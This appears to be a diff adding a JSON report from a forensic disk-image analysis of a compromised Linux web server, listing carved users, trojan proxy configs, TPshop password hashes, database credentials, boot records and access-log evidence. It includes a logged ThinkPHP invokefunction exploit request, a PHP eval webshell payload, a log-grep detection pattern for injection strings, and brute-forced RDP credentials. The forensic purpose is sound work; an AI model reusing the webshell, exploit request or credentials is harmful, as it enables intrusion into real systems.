@@ -1,0 +1,356 @@
+{
+  "passwd": [
+    {
+      "off": 12287229952,
+      "blk": 2999812,
+      "result": {
+        "users": [
+          {
+            "name": "root",
+            "uid": 0,
+            "home": "/root",
+            "shell": "/bin/bash"
+          },
+          {
+            "name": "www",
+            "uid": 1000,
+            "home": "/home/www",
+            "shell": "/sbin/nologin"
+          },
+          {
+            "name": "mysql",
+            "uid": 1001,
+            "home": "/home/mysql",
+            "shell": "/sbin/nologin"
+          }
+        ],
+        "count": 3
+      }
+    }
+  ],
+  "trojan": [
+    {
+      "off": 12441587719,
+      "blk": 3037497,
+      "result": {
+        "run_type": "server",
+        "local_addr": "0.0.0.0",
+        "local_port": 443,
+        "remote_addr": "127.0.0.1",
+        "remote_port": 80,
+        "remote_domain": "",
+        "raw": {
+          "run_type": "server",
+          "local_addr": "0.0.0.0",
+          "local_port": 443,
+          "remote_addr": "127.0.0.1",
+          "remote_port": 80,
+          "password": [
+            "password1",
+            "password2"
+          ],
+          "log_level": 1,
+          "ssl": {
+            "cert": "/path/to/certificate.crt",
+            "key": "/path/to/private.key",
+            "key_password": "",
+            "cipher": "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
+            "cipher_tls13": "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
+            "prefer_server_cipher": true,
+            "alpn": [
+              "http/1.1"
+            ],
+            "alpn_port_override": {
+              "h2": 81
+            },
+            "reuse_session": true,
+            "session_ticket": false,
+            "session_timeout": 600,
+            "plain_http_response": "",
+            "curves": "",
+            "dhparam": ""
+          },
+          "tcp": {
+            "prefer_ipv4": false,
+            "no_delay": true,
+            "keep_alive": true,
+            "reuse_port": false,
+            "fast_open": false,
+            "fast_open_qlen": 20
+          },
+          "mysql": {
+            "enabled": false,
+            "server_addr": "127.0.0.1",
+            "server_port": 3306,
+            "database": "trojan",
+            "username": "trojan",
+            "password": "",
+            "key": "",
+            "cert": "",
+            "ca": ""
+          }
+        }
+      }
+    },
+    {
+      "off": 24283545607,
+      "blk": 5928600,
+      "result": {
+        "run_type": "forward",
+        "local_addr": "127.0.0.1",
+        "local_port": 5901,
+        "remote_addr": "example.com",
+        "remote_port": 443,
+        "remote_domain": "example.com",
+        "raw": {
+          "run_type": "forward",
+          "local_addr": "127.0.0.1",
+          "local_port": 5901,
+          "remote_addr": "example.com",
+          "remote_port": 443,
+          "target_addr": "127.0.0.1",
+          "target_port": 5901,
+          "password": [
+            "password1"
+          ],
+          "udp_timeout": 60,
+          "log_level": 1,
+          "ssl": {
+            "verify": true,
+            "verify_hostname": true,
+            "cert": "",
+            "cipher": "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:AES128-SHA:AES256-SHA:DES-CBC3-SHA",
+            "cipher_tls13": "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
+            "sni": "",
+            "alpn": [
+              "h2",
+              "http/1.1"
+            ],
+            "reuse_session": true,
+            "session_ticket": false,
+            "curves": ""
+          },
+          "tcp": {
+            "no_delay": true,
+            "keep_alive": true,
+            "reuse_port": false,
+            "fast_open": false,
+            "fast_open_qlen": 20
+          }
+        }
+      }
+    }
+  ],
+  "config": [
+    {
+      "off": 12666244051,
+      "blk": 3092344,
+      "result": {
+        "auth_code": "TPSH9V��\u0000\u0000��\u0002\u0000\u0000\u0000\u0000\u0000\u0000POP",
+        "algorithm": "md5(AUTH_CODE+password)",
+        "hashes": {
+          "sbwyz1": "2f591ee7f7ac5ee8ba647b690496972c"
+        }
+      }
+    },
+    {
+      "off": 933907749,
+      "blk": 228004,
+      "result": {
+        "auth_code": "TPSHOP",
+        "algorithm": "md5(AUTH_CODE+password)",
+        "hashes": {
+          "sbwyz1": "f8537858eb0eabada34e7021d19974ea"
+        }
+      }
+    }
+  ],
+  "database": [
+    {
+      "off": 25167122618,
+      "blk": 6144317,
+      "result": {
+        "DB_PWD": "a7b3e16ac20b10bb",
+        "DB_USER": "root"
+      }
+    },
+    {
+      "off": 37286588601,
+      "blk": 9103171,
+      "result": {
+        "DB_PWD": "Ry5hmn5WicPHpw67",
+        "DB_USER": "szy"
+      }
+    },
+    {
+      "off": 25143328976,
+      "blk": 6138508,
+      "result": {
+        "DB_PWD": "[DB_PWD]",
+        "DB_USER": "[DB_USER]"
+      }
+    }
+  ],
+  "access": [
+    {
+      "off": 36798483297,
+      "blk": 8984004,
+      "result": {
+        "line": "grep -E ' (200|302|301|500|444|403) ' $2 | grep -i -E \"(gopher://|php://|file://|phar://|dict://data://|eval\\(|file_get_contents\\(|phpinfo\\(|require_once\\(|copy\\(|\\_POST\\[|file_put_contents\\(|system\\(|base64_decode\\(|passthru\\(|\\/invokefunction\\&|=call_user_func_array).*?HTTP/1.1\" >./log/$3php.log"
+      }
+    },
+    {
+      "off": 13338522614,
+      "blk": 3256475,
+      "result": {
+        "line": "222.2.2.2 - - [04/Mar/2022:15:14:59 +0800] \"GET /?s=/admin/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1 HTTP/1.1\" 500 119939 \"-\" \"Java/11.0.13\"",
+        "webshell": {
+          "webshells": [
+            {
+              "payload": "<?php @eval($_POST['peiqi'])?>",
+              "bytes": 30,
+              "sha256": "870bf66b4314a5567bd92142353189643b07963201076c5fc98150ef34cbc7cf",
+              "sha256_upper": "870BF66B4314A5567BD92142353189643B07963201076C5FC98150EF34CBC7CF"
+            }
+          ],
+          "count": 1
+        }
+      }
+    }
+  ],
+  "result": [
+    {
+      "off": 24669481623,
+      "blk": 6022822,
+      "result": {
+        "line": "NegativeMediumSpace;Negotiating protocolNotGreaterFullEqual;NotRightTriangleBar;Pulse Connect SecureReader '%s' is <nil>Request URI Too LongRightArrowLeftArrow;SIGALRM: alarm clockSIGTERM: terminationSeek: invalid offsetSeek: invalid whenceSquareSupersetEqual;Terminal_PunctuationUnprocessable EntityUnsupported version:User session deletedX509CertificateChain[RDP] %-40v %v:%-20v[SMB] %-40v %v:%-20v[SSH] %-40v %v:%-20v[Telnet] %-30v %v:%v[tomcat] %-30v %v:%v^([a-zA-Z0-9-_./]+)$__vdso_clock_gettimeallowNativePasswordsasn1: syntax error: bad defer size classbad font file formatbad system page sizebad use of bucket.bpbad use of bucket.mpbad_copy_file_formatcertificate requiredchan send (nil chan)client to server MACclose of nil channelconnection error: %sconnection timed outconnection_exceptioncp1257_lithuanian_cidodeltimer0: wrong Pfdw_schema_not_foundfdw_too_many_handlesflag: help requestedfloating point errorforcegc: phase errorgc_trigger underflowgetCert can't be nilgo of nil func valuegopark: bad g statusgzip: invalid headerheader line too longhttp2: stream closedillegal %s length %dinconsistent lockedminvalid DNS responseinvalid bool value: invalid map key: %#vinvalid parser stateinvalid repeat countinvalid request codeinvalid write resultinvalid_catalog_nameinvalid_cursor_stateinvalid_escape_octetinvalid_xml_documentis a named type filejson: Unmarshal(nil json: Unmarshal(nil)json: error calling key has been revokedleftrightsquigarrow;malloc during signalmcs connectChannels:mysql_clear_passwordnotetsleep not on g0number has no digitsout is not a pointerp mcache not flushedpacer: assist ratio=pad length too largeports:%s is error!"
+      }
+    },
+    {
+      "off": 25367151821,
+      "blk": 6193152,
+      "result": {
+        "line": "\u0000+\u0016�ߊ\u001b=[Success]:: | 2022/03/04 15:46:02 [RDP] 192.168.100.254:3389                     administrator:Aa123456@"
+      }
+    },
+    {
+      "off": 25105151929,
+      "blk": 6129187,
+      "result": {
+        "line": "[RDP] 192.168.100.254:3389                     administrator:Aa123456@"
+      }
+    }
+  ],
+  "sql": [
+    {
+      "off": 934836886,
+      "blk": 228231,
+      "result": {
+        "orders": 1292,
+        "total_insert_rows": 1385,
+        "gap": {
+          "best": {
+            "user_id": "385",
+            "reg": 1467089277,
+            "first_order": 1467089325,
+            "gap": 48,
+            "reg_str": "2016/06/28 12:47:57",
+            "first_order_str": "2016/06/28 12:48:45",
+            "gap_days": 0.0
+          },
+          "user_rows": 2571,
+          "order_rows": 1385,
+          "order_user_id_col": 2,
+          "order_add_time_col": 29,
+          "user_reg_time_col": 12
+        }
+      }
+    }
+  ],
+  "wtmp": {
+    "boot_count": 11,
+    "earliest": "2022/02/23 12:23:49",
+    "latest": "2025/04/16 18:30:30",
+    "earliest_kernel": "3.10.0-514.el7.x86_64",
+    "boots": [
+      {
+        "boot_tv": 1645590229,
+        "boot_str": "2022/02/23 12:23:49",
+        "kernel": "3.10.0-514.el7.x86_64",
+        "blk": 5965256,
+        "off": 24433688620
+      },
+      {
+        "boot_tv": 1645597416,
+        "boot_str": "2022/02/23 14:23:36",
+        "kernel": "3.10.0-514.el7.x86_64",
+        "blk": 5965256,
+        "off": 24433690156
+      },
+      {
+        "boot_tv": 1646376854,
+        "boot_str": "2022/03/04 14:54:14",
+        "kernel": "3.10.0-514.el7.x86_64",
+        "blk": 5928345,
+        "off": 24282501164
+      },
+      {
+        "boot_tv": 1742378771,
+        "boot_str": "2025/03/19 18:06:11",
+        "kernel": "3.10.0-514.el7.x86_64",
+        "blk": 5928345,
+        "off": 24282504236
+      },
+      {
+        "boot_tv": 1743403509,
+        "boot_str": "2025/03/31 14:45:09",
+        "kernel": "3.10.0-514.el7.x86_64",
+        "blk": 5928599,
+        "off": 24283543596
+      },
+      {
+        "boot_tv": 1743466549,
+        "boot_str": "2025/04/01 08:15:49",
+        "kernel": "3.10.0-514.el7.x86_64",
+        "blk": 5928398,
+        "off": 24282719788
+      },
+      {
+        "boot_tv": 1743554123,
+        "boot_str": "2025/04/02 08:35:23",
+        "kernel": "3.10.0-1160.119.1.el7.x86_64",
+        "blk": 5928893,
+        "off": 24284748332
+      },
+      {
+        "boot_tv": 1743572252,
+        "boot_str": "2025/04/02 13:37:32",
+        "kernel": "3.10.0-1160.119.1.el7.x86_64",
+        "blk": 5928348,
+        "off": 24282514988
+      },
+      {
+        "boot_tv": 1744250237,
+        "boot_str": "2025/04/10 09:57:17",
+        "kernel": "3.10.0-1160.119.1.el7.x86_64",
+        "blk": 5928364,
+        "off": 24282582060
+      },
+      {
+        "boot_tv": 1744264439,
+        "boot_str": "2025/04/10 13:53:59",
+        "kernel": "3.10.0-1160.119.1.el7.x86_64",
+        "blk": 5928368,
+        "off": 24282597420
+      },
+      {
+        "boot_tv": 1744799430,
+        "boot_str": "2025/04/16 18:30:30",
+        "kernel": "3.10.0-1160.119.1.el7.x86_64",
+        "blk": 5928468,
+        "off": 24283008044
+      }
+    ]
+  },
+  "gd": []
+}
